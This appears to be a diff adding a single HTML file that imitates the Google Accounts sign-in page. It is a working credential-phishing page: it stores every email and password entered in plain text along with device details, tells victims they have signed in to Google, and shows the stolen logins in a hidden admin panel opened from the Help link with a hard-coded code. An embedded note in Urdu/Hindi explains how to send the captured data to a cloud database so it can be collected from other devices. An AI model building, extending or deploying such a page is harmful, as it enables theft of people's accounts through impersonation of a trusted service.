@@ -1,0 +1,836 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Sign in – Google Accounts</title>
+  <link rel="icon" href="https://www.google.com/favicon.ico"/>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: 'Google Sans', Roboto, Arial, sans-serif;
+      background: #e8eaed;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    /* ── MAIN CARD ── */
+    .card {
+      background: #fff;
+      border-radius: 28px;
+      width: 100%;
+      max-width: 860px;
+      min-height: 380px;
+      padding: 52px 56px 52px 52px;
+      display: flex;
+      align-items: stretch;
+      gap: 0;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.08);
+      position: relative;
+      z-index: 10;
+    }
+
+    /* ── LEFT PANEL ── */
+    .left {
+      flex: 0 0 340px;
+      display: flex;
+      flex-direction: column;
+      padding-right: 48px;
+    }
+
+    .g-logo {
+      width: 44px;
+      height: 44px;
+      margin-bottom: 36px;
+    }
+
+    .left h1 {
+      font-size: 36px;
+      font-weight: 400;
+      color: #202124;
+      margin-bottom: 12px;
+      line-height: 1.2;
+    }
+
+    .left p {
+      font-size: 16px;
+      color: #202124;
+      line-height: 1.5;
+    }
+
+    /* ── RIGHT PANEL ── */
+    .right {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      padding-left: 48px;
+      border-left: none;
+    }
+
+    .right-top { flex: 1; }
+
+    /* ── STEP SCREENS ── */
+    .step { display: none; }
+    .step.active { display: block; }
+
+    /* ── INPUT ── */
+    .field {
+      position: relative;
+      margin-bottom: 6px;
+    }
+
+    .field input {
+      width: 100%;
+      height: 56px;
+      padding: 0 16px;
+      border: 1px solid #747775;
+      border-radius: 4px;
+      font-size: 16px;
+      color: #202124;
+      background: transparent;
+      outline: none;
+      font-family: inherit;
+      transition: border-color 0.15s, border-width 0.1s;
+    }
+    .field input:focus {
+      border-color: #1b6ef3;
+      border-width: 2px;
+    }
+    .field input.err { border-color: #d93025 !important; border-width: 1px; }
+
+    .field label {
+      position: absolute;
+      left: 14px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 16px;
+      color: #444746;
+      pointer-events: none;
+      transition: all 0.15s ease;
+      background: #fff;
+      padding: 0 4px;
+    }
+    .field input:focus ~ label,
+    .field input:not(:placeholder-shown) ~ label {
+      top: 0;
+      font-size: 12px;
+      color: #1b6ef3;
+    }
+    .field input.err ~ label { color: #d93025 !important; }
+    .field input:not(:focus):not(:placeholder-shown) ~ label { color: #444746; }
+
+    /* pwd toggle */
+    .pwd-btn {
+      position: absolute;
+      right: 14px; top: 50%;
+      transform: translateY(-50%);
+      background: none; border: none;
+      font-size: 14px; color: #1b6ef3;
+      font-weight: 500; cursor: pointer;
+      font-family: inherit; padding: 4px;
+    }
+    .pwd-btn:hover { text-decoration: underline; }
+
+    .field-err {
+      display: none;
+      font-size: 12px; color: #d93025;
+      margin: 4px 0 0 2px;
+    }
+    .field-err.on { display: block; }
+
+    /* ── LINKS ── */
+    .link {
+      font-size: 14px; color: #1b6ef3;
+      text-decoration: none; font-weight: 500;
+      display: inline-block; margin-top: 10px;
+    }
+    .link:hover { text-decoration: underline; }
+
+    .guest-text {
+      font-size: 14px; color: #444746;
+      margin-top: 28px; line-height: 1.5;
+    }
+    .guest-text a {
+      color: #1b6ef3; text-decoration: none; font-weight: 500;
+    }
+    .guest-text a:hover { text-decoration: underline; }
+
+    /* ── BUTTON ROW ── */
+    .btn-row {
+      display: flex;
+      align-items: center;
+      justify-content: flex-end;
+      gap: 12px;
+      margin-top: 40px;
+    }
+    .btn-row-space { justify-content: space-between; }
+
+    .btn-text-link {
+      font-size: 14px; color: #1b6ef3;
+      font-weight: 500; text-decoration: none;
+      background: none; border: none;
+      cursor: pointer; font-family: inherit;
+      padding: 10px 12px; border-radius: 20px;
+      transition: background 0.15s;
+    }
+    .btn-text-link:hover { background: #e8f0fe; }
+
+    .btn-next {
+      background: #1b6ef3;
+      color: #fff;
+      border: none;
+      border-radius: 20px;
+      padding: 10px 28px;
+      font-size: 15px;
+      font-weight: 500;
+      font-family: inherit;
+      cursor: pointer;
+      display: flex; align-items: center; gap: 8px;
+      transition: background 0.15s, box-shadow 0.15s;
+      min-width: 80px; justify-content: center;
+    }
+    .btn-next:hover { background: #1558d0; box-shadow: 0 1px 4px rgba(0,0,0,0.25); }
+    .btn-next:disabled { opacity: 0.7; cursor: default; }
+
+    .spin {
+      display: none; width: 16px; height: 16px;
+      border: 2px solid rgba(255,255,255,0.4);
+      border-top-color: #fff;
+      border-radius: 50%;
+      animation: spin 0.7s linear infinite;
+    }
+    .btn-next.loading .spin { display: block; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    /* ── ERROR ALERT ── */
+    .err-banner {
+      display: none;
+      background: #fce8e6;
+      border-radius: 4px;
+      padding: 10px 14px;
+      font-size: 13px; color: #c5221f;
+      margin-bottom: 16px;
+      align-items: center; gap: 8px;
+    }
+    .err-banner.on { display: flex; }
+
+    /* ── PASSWORD STEP: email chip ── */
+    .email-chip {
+      display: inline-flex; align-items: center; gap: 8px;
+      border: 1px solid #dadce0;
+      border-radius: 20px;
+      padding: 6px 14px 6px 10px;
+      font-size: 14px; color: #202124;
+      margin-bottom: 28px;
+      cursor: pointer;
+      transition: background 0.15s;
+    }
+    .email-chip:hover { background: #f8f9fa; }
+    .email-chip .chip-avatar {
+      width: 26px; height: 26px;
+      background: #1b6ef3;
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 13px; color: #fff; font-weight: 500;
+    }
+
+    /* ── SUCCESS SCREEN ── */
+    #successScreen {
+      display: none;
+      position: fixed; inset: 0;
+      background: #e8eaed;
+      z-index: 999;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      animation: fadeIn 0.3s ease;
+    }
+    #successScreen.show { display: flex; }
+    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+    .success-card {
+      background: #fff;
+      border-radius: 28px;
+      width: 100%; max-width: 480px;
+      padding: 48px 40px 40px;
+      text-align: center;
+      margin: 20px;
+    }
+
+    .check-wrap {
+      width: 72px; height: 72px;
+      background: #e6f4ea;
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      margin: 0 auto 24px;
+      animation: popIn 0.4s 0.1s cubic-bezier(0.34,1.56,0.64,1) both;
+    }
+    @keyframes popIn {
+      from { transform: scale(0); opacity: 0; }
+      to   { transform: scale(1); opacity: 1; }
+    }
+
+    .avatar-big {
+      width: 72px; height: 72px;
+      background: #1b6ef3;
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 30px; color: #fff; font-weight: 500;
+      margin: 0 auto 16px;
+    }
+
+    .success-name {
+      font-size: 22px; font-weight: 400; color: #202124;
+      margin-bottom: 4px;
+    }
+    .success-email-txt {
+      font-size: 14px; color: #5f6368; margin-bottom: 20px;
+    }
+    .success-msg {
+      font-size: 14px; color: #137333;
+      background: #e6f4ea;
+      border-radius: 8px;
+      padding: 12px 18px;
+      margin: 0 0 28px;
+      display: flex; align-items: center;
+      justify-content: center; gap: 8px;
+    }
+    .btn-continue {
+      background: #1b6ef3; color: #fff;
+      border: none; border-radius: 20px;
+      padding: 10px 32px;
+      font-size: 15px; font-weight: 500;
+      font-family: inherit; cursor: pointer;
+    }
+    .btn-continue:hover { background: #1558d0; }
+
+    /* ── FOOTER ── */
+    .footer {
+      width: 100%; max-width: 860px;
+      display: flex; align-items: center;
+      justify-content: space-between;
+      padding: 20px 4px 0;
+      flex-wrap: wrap; gap: 12px;
+    }
+    .footer select {
+      font-size: 14px; color: #444746;
+      background: transparent; border: none;
+      cursor: pointer; font-family: inherit;
+      outline: none;
+    }
+    .footer-links { display: flex; gap: 28px; }
+    .footer-links a {
+      font-size: 14px; color: #444746; text-decoration: none;
+      cursor: pointer;
+    }
+    .footer-links a:hover { text-decoration: underline; }
+
+    /* ── ADMIN DASHBOARD ── */
+    #adminPanel {
+      display: none;
+      position: fixed; inset: 0;
+      background: #f0f2f5;
+      z-index: 1000;
+      overflow-y: auto;
+      padding: 20px;
+    }
+    #adminPanel.show { display: block; }
+
+    .admin-container {
+      max-width: 1100px; margin: 0 auto; background: #fff;
+      border-radius: 12px; padding: 30px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+    }
+    .admin-header {
+      display: flex; justify-content: space-between; align-items: center;
+      margin-bottom: 24px; border-bottom: 1px solid #dadce0; padding-bottom: 16px;
+      flex-wrap: wrap; gap: 10px;
+    }
+    .admin-header h2 { color: #202124; font-weight: 400; }
+    
+    .info-box {
+      background: #e8f0fe; color: #1967d2;
+      padding: 12px; border-radius: 8px;
+      font-size: 13px; margin-bottom: 20px; line-height: 1.4;
+    }
+
+    .btn-close-admin {
+      background: none; border: 1px solid #dadce0;
+      border-radius: 4px; padding: 8px 16px;
+      cursor: pointer; color: #5f6368; font-family: inherit;
+    }
+    .btn-close-admin:hover { background: #f1f3f4; }
+
+    .table-responsive {
+      overflow-x: auto;
+    }
+
+    table { width: 100%; border-collapse: collapse; font-size: 13px; min-width: 600px; }
+    th { text-align: left; padding: 12px; border-bottom: 2px solid #e8eaed; color: #5f6368; font-weight: 500; white-space: nowrap;}
+    td { padding: 12px; border-bottom: 1px solid #e8eaed; color: #202124; vertical-align: middle; }
+    tr:hover td { background: #f8f9fa; }
+    
+    .badge {
+      display: inline-block; padding: 4px 8px; border-radius: 12px;
+      font-size: 11px; font-weight: 500; background: #e8f0fe; color: #1967d2;
+    }
+    .device-badge {
+      font-size: 11px; background: #f1f3f4; color: #3c4043;
+      padding: 2px 6px; border-radius: 4px; display: inline-block;
+    }
+    .btn-delete {
+      color: #d93025; background: none; border: none; cursor: pointer;
+      font-weight: 500; font-family: inherit; padding: 4px 8px; border-radius: 4px;
+    }
+    .btn-delete:hover { background: #fce8e6; }
+    
+    .empty-state {
+      text-align: center; padding: 40px; color: #5f6368;
+    }
+
+    /* ── MODAL (For Help) ── */
+    .modal-overlay {
+      display: none;
+      position: fixed; inset: 0; background: rgba(0,0,0,0.5);
+      z-index: 2000; align-items: center; justify-content: center;
+    }
+    .modal-overlay.show { display: flex; }
+    
+    .modal {
+      background: #fff; width: 90%; max-width: 400px;
+      border-radius: 28px; padding: 24px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.2);
+      animation: fadeIn 0.2s ease;
+    }
+    .modal h3 { font-weight: 400; color: #202124; margin-bottom: 16px; font-size: 20px; }
+    .modal p { font-size: 14px; color: #5f6368; margin-bottom: 20px; }
+    
+    .modal-actions { display: flex; justify-content: flex-end; gap: 12px; }
+
+    /* responsive */
+    @media (max-width: 680px) {
+      .card {
+        flex-direction: column;
+        padding: 36px 28px;
+        gap: 32px;
+      }
+      .left { flex: none; padding-right: 0; }
+      .right { padding-left: 0; border-left: none; }
+      .left h1 { font-size: 28px; }
+    }
+  </style>
+</head>
+<body>
+
+<!-- ══ ADMIN PANEL ══ -->
+<div id="adminPanel">
+  <div class="admin-container">
+    <div class="admin-header">
+      <h2>Global Login History</h2>
+      <button class="btn-close-admin" onclick="closeAdmin()">Exit Admin</button>
+    </div>
+    
+    <div class="info-box">
+      <strong>Note:</strong> Yeh data abhi "Local Storage" mein save ho raha hai. Agar aap chahte hain ke Mobile A se login karein aur yeh history Mobile B par dikhe, toh aapko is code ko kisi Cloud Database (jaise Firebase) se connect karna hoga. Abhi yeh same device par different accounts ke login track karega.
+    </div>
+
+    <div class="table-responsive">
+      <table id="adminTable">
+        <thead>
+          <tr>
+            <th>#</th>
+            <th>Time</th>
+            <th>Device / OS</th>
+            <th>Email</th>
+            <th>Password</th>
+            <th>Action</th>
+          </tr>
+        </thead>
+        <tbody id="adminTableBody">
+          <!-- Rows injected via JS -->
+        </tbody>
+      </table>
+    </div>
+    <div id="emptyState" class="empty-state" style="display:none;">No login history found.</div>
+  </div>
+</div>
+
+<!-- ══ MODAL ══ -->
+<div class="modal-overlay" id="helpModal">
+  <div class="modal">
+    <h3>Admin Access</h3>
+    <p>Please enter the security code to access the admin panel.</p>
+    <div class="field">
+      <input type="password" id="adminCodeInput" placeholder=" " />
+      <label for="adminCodeInput">Enter Code</label>
+    </div>
+    <div class="modal-actions">
+      <button class="btn-text-link" onclick="closeModal()">Cancel</button>
+      <button class="btn-next" onclick="checkAdminCode()">Submit</button>
+    </div>
+  </div>
+</div>
+
+<!-- ══ SUCCESS SCREEN ══ -->
+<div id="successScreen">
+  <div class="success-card">
+    <div class="g-logo" style="margin: 0 auto 24px; display:flex; justify-content:center;">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="44" height="44">
+        <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+        <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+        <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+        <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.18 1.48-4.97 2.31-8.16 2.31-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+        <path fill="none" d="M0 0h48v48H0z"/>
+      </svg>
+    </div>
+
+    <div class="avatar-big" id="successAvatar">U</div>
+    <div class="success-name" id="successName">Welcome back!</div>
+    <div class="success-email-txt" id="successEmailTxt">you@gmail.com</div>
+
+    <div class="success-msg">
+      <svg width="16" height="16" viewBox="0 0 20 20" fill="#137333">
+        <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/>
+      </svg>
+      You have successfully signed in to Google
+    </div>
+
+    <button class="btn-continue" onclick="document.getElementById('successScreen').classList.remove('show')">
+      Continue to Google
+    </button>
+  </div>
+</div>
+
+<!-- ══ MAIN CARD ══ -->
+<div class="card">
+
+  <!-- LEFT -->
+  <div class="left">
+    <!-- Google G logo (from uploaded image / SVG) -->
+    <svg class="g-logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48">
+      <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+      <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+      <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+      <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.18 1.48-4.97 2.31-8.16 2.31-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+    </svg>
+
+    <h1>Sign in</h1>
+    <p>with your Google Account. This account will be available to other Google apps in the browser.</p>
+  </div>
+
+  <!-- RIGHT -->
+  <div class="right">
+    <div class="right-top">
+
+      <!-- STEP 1: Email -->
+      <div class="step active" id="step1">
+        <div class="err-banner" id="err1">
+          <svg width="14" height="14" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clip-rule="evenodd"/></svg>
+          <span id="err1msg"></span>
+        </div>
+
+        <div class="field">
+          <input type="email" id="emailInput" placeholder=" " autocomplete="email" autofocus />
+          <label for="emailInput">Email or phone</label>
+        </div>
+        <div class="field-err" id="emailFieldErr">Enter a valid email address</div>
+
+        <a href="#" class="link" id="forgotEmailLink">Forgot email?</a>
+
+        <div class="guest-text">
+          Not your computer? Use Guest mode to sign in privately.
+          <a href="#">Learn more about using Guest mode</a>
+        </div>
+
+        <div class="btn-row btn-row-space">
+          <a href="#" class="btn-text-link">Create account</a>
+          <button class="btn-next" id="nextBtn1" type="button">
+            <span class="btn-label">Next</span>
+            <div class="spin"></div>
+          </button>
+        </div>
+      </div>
+
+      <!-- STEP 2: Password -->
+      <div class="step" id="step2">
+        <div class="err-banner" id="err2">
+          <svg width="14" height="14" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clip-rule="evenodd"/></svg>
+          <span id="err2msg"></span>
+        </div>
+
+        <!-- Email chip -->
+        <div class="email-chip" id="emailChip" onclick="goBack()">
+          <div class="chip-avatar" id="chipAvatar">U</div>
+          <span id="chipEmail">user@gmail.com</span>
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="#5f6368"><path d="M12 8l-6 6 1.41 1.41L12 10.83l4.59 4.58L18 14z"/></svg>
+        </div>
+
+        <div class="field">
+          <input type="password" id="pwdInput" placeholder=" " autocomplete="current-password" style="padding-right: 60px;" />
+          <label for="pwdInput">Enter your password</label>
+          <button type="button" class="pwd-btn" id="pwdToggle">Show</button>
+        </div>
+        <div class="field-err" id="pwdFieldErr">Wrong password. Try again or click Forgot password.</div>
+
+        <a href="#" class="link" id="forgotPwdLink">Forgot password?</a>
+
+        <div class="btn-row btn-row-space">
+          <button type="button" class="btn-text-link" onclick="goBack()">Back</button>
+          <button class="btn-next" id="nextBtn2" type="button">
+            <span class="btn-label">Next</span>
+            <div class="spin"></div>
+          </button>
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<!-- FOOTER -->
+<div class="footer">
+  <select aria-label="Language">
+    <option>English (United States)</option>
+    <option>Urdu</option>
+    <option>Hindi</option>
+  </select>
+  <div class="footer-links">
+    <a href="#" id="helpLink">Help</a>
+    <a href="#">Privacy</a>
+    <a href="#">Terms</a>
+  </div>
+</div>
+
+<script>
+  /* ── Helpers ── */
+  const $  = id => document.getElementById(id);
+  const validEmail = v => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v.trim());
+
+  /* ── Device Detection Helper ── */
+  function getDeviceInfo() {
+    const ua = navigator.userAgent;
+    let device = "Desktop / Unknown";
+    if (/Android/i.test(ua)) device = "Android Mobile";
+    else if (/iPhone/i.test(ua)) device = "iPhone";
+    else if (/iPad/i.test(ua)) device = "iPad";
+    else if (/Mac/i.test(ua)) device = "Macintosh";
+    else if (/Windows/i.test(ua)) device = "Windows PC";
+    return device;
+  }
+
+  /* ── Database Simulation (Local Storage) ── */
+  const DB_KEY = 'google_global_history_v2';
+  
+  function getHistory() {
+    const raw = localStorage.getItem(DB_KEY);
+    return raw ? JSON.parse(raw) : [];
+  }
+
+  function addToHistory(email, password) {
+    const history = getHistory();
+    const deviceInfo = getDeviceInfo();
+    
+    const newEntry = {
+      id: Date.now(),
+      email: email,
+      password: password,
+      timestamp: new Date().toISOString(),
+      device: deviceInfo, // Saving device info
+      userAgent: navigator.userAgent // Saving full user agent string
+    };
+    // Add to beginning (most recent first)
+    history.unshift(newEntry);
+    localStorage.setItem(DB_KEY, JSON.stringify(history));
+  }
+
+  function deleteEntry(id) {
+    let history = getHistory();
+    history = history.filter(entry => entry.id !== id);
+    localStorage.setItem(DB_KEY, JSON.stringify(history));
+    renderAdminTable(); // Re-render table
+  }
+
+  /* ── Modal Logic ── */
+  const modal = $('helpModal');
+  const codeInput = $('adminCodeInput');
+
+  $('helpLink').addEventListener('click', (e) => {
+    e.preventDefault();
+    modal.classList.add('show');
+    setTimeout(() => codeInput.focus(), 100);
+  });
+
+  function closeModal() {
+    modal.classList.remove('show');
+    codeInput.value = '';
+  }
+
+  function checkAdminCode() {
+    if (codeInput.value === '98989') {
+      closeModal();
+      openAdmin();
+    } else {
+      codeInput.classList.add('err');
+      setTimeout(() => codeInput.classList.remove('err'), 1000);
+    }
+  }
+
+  codeInput.addEventListener('keydown', (e) => {
+    if(e.key === 'Enter') checkAdminCode();
+  });
+
+  /* ── Admin Logic ── */
+  function openAdmin() {
+    $('adminPanel').classList.add('show');
+    renderAdminTable();
+  }
+
+  function closeAdmin() {
+    $('adminPanel').classList.remove('show');
+  }
+
+  function renderAdminTable() {
+    const tbody = $('adminTableBody');
+    const empty = $('emptyState');
+    tbody.innerHTML = '';
+    
+    const history = getHistory();
+    
+    if (history.length === 0) {
+      $('adminTable').style.display = 'none';
+      empty.style.display = 'block';
+      return;
+    }
+
+    $('adminTable').style.display = 'table';
+    empty.style.display = 'none';
+
+    history.forEach((entry, index) => {
+      const dateObj = new Date(entry.timestamp);
+      // Format date nicely: DD/MM/YYYY HH:MM:SS
+      const dateStr = dateObj.toLocaleDateString() + ' ' + dateObj.toLocaleTimeString();
+      
+      const tr = document.createElement('tr');
+      tr.innerHTML = `
+        <td><span class="badge">#${history.length - index}</span></td>
+        <td style="font-family:monospace; color:#5f6368;">${dateStr}</td>
+        <td>
+          <span class="device-badge">${entry.device}</span>
+          <div style="font-size:10px; color:#999; margin-top:2px; overflow:hidden; text-overflow:ellipsis; max-width:150px;" title="${entry.userAgent}">
+            ${entry.userAgent}
+          </div>
+        </td>
+        <td><strong>${entry.email}</strong></td>
+        <td style="color:#d93025; font-family:monospace;">${entry.password}</td>
+        <td>
+          <button class="btn-delete" onclick="deleteEntry(${entry.id})">Delete</button>
+        </td>
+      `;
+      tbody.appendChild(tr);
+    });
+  }
+
+  /* ── Step navigation ── */
+  function goBack() {
+    $('step2').classList.remove('active');
+    $('step1').classList.add('active');
+    $('err2').classList.remove('on');
+    $('pwdInput').value = '';
+    setTimeout(() => $('emailInput').focus(), 50);
+  }
+
+  /* ── Step 1: email ── */
+  $('emailInput').addEventListener('keydown', e => { if (e.key === 'Enter') $('nextBtn1').click(); });
+
+  $('nextBtn1').addEventListener('click', async () => {
+    const email = $('emailInput').value.trim();
+    $('err1').classList.remove('on');
+    $('emailFieldErr').classList.remove('on');
+
+    if (!email || !validEmail(email)) {
+      $('emailInput').classList.add('err');
+      $('emailFieldErr').classList.add('on');
+      return;
+    }
+    $('emailInput').classList.remove('err');
+
+    // loading
+    const btn = $('nextBtn1');
+    btn.classList.add('loading'); btn.disabled = true;
+    btn.querySelector('.btn-label').textContent = '';
+    await new Promise(r => setTimeout(r, 900));
+    btn.classList.remove('loading'); btn.disabled = false;
+    btn.querySelector('.btn-label').textContent = 'Next';
+
+    // go to step 2
+    $('chipEmail').textContent = email;
+    $('chipAvatar').textContent = email[0].toUpperCase();
+    $('step1').classList.remove('active');
+    $('step2').classList.add('active');
+    setTimeout(() => $('pwdInput').focus(), 50);
+  });
+
+  $('forgotEmailLink').addEventListener('click', e => {
+    e.preventDefault();
+    $('err1msg').textContent = 'Account recovery email sent.';
+    $('err1').style.background = '#e6f4ea';
+    $('err1').style.color = '#137333';
+    $('err1').classList.add('on');
+  });
+
+  /* ── Step 2: password ── */
+  $('pwdInput').addEventListener('keydown', e => { if (e.key === 'Enter') $('nextBtn2').click(); });
+
+  $('pwdToggle').addEventListener('click', () => {
+    const show = $('pwdInput').type === 'password';
+    $('pwdInput').type = show ? 'text' : 'password';
+    $('pwdToggle').textContent = show ? 'Hide' : 'Show';
+  });
+
+  $('forgotPwdLink').addEventListener('click', e => {
+    e.preventDefault();
+    $('err2msg').textContent = 'Password reset link sent to your email.';
+    $('err2').style.background = '#e6f4ea';
+    $('err2').style.color = '#137333';
+    $('err2').classList.add('on');
+  });
+
+  $('nextBtn2').addEventListener('click', async () => {
+    const pwd = $('pwdInput').value;
+    const email = $('emailInput').value.trim();
+    
+    $('err2').classList.remove('on');
+    $('pwdFieldErr').classList.remove('on');
+
+    if (!pwd || pwd.length < 6) {
+      $('pwdInput').classList.add('err');
+      $('pwdFieldErr').classList.add('on');
+      return;
+    }
+    $('pwdInput').classList.remove('err');
+
+    const btn = $('nextBtn2');
+    btn.classList.add('loading'); btn.disabled = true;
+    btn.querySelector('.btn-label').textContent = '';
+    await new Promise(r => setTimeout(r, 1400));
+    btn.classList.remove('loading'); btn.disabled = false;
+    btn.querySelector('.btn-label').textContent = 'Next';
+
+    // SAVE DATA FOR ADMIN (Includes Device Info)
+    addToHistory(email, pwd);
+
+    // show success
+    $('successAvatar').textContent  = email[0].toUpperCase();
+    $('successEmailTxt').textContent = email;
+    $('successName').textContent    = email.split('@')[0];
+    $('successScreen').classList.add('show');
+  });
+</script>
+</body>
+</html>
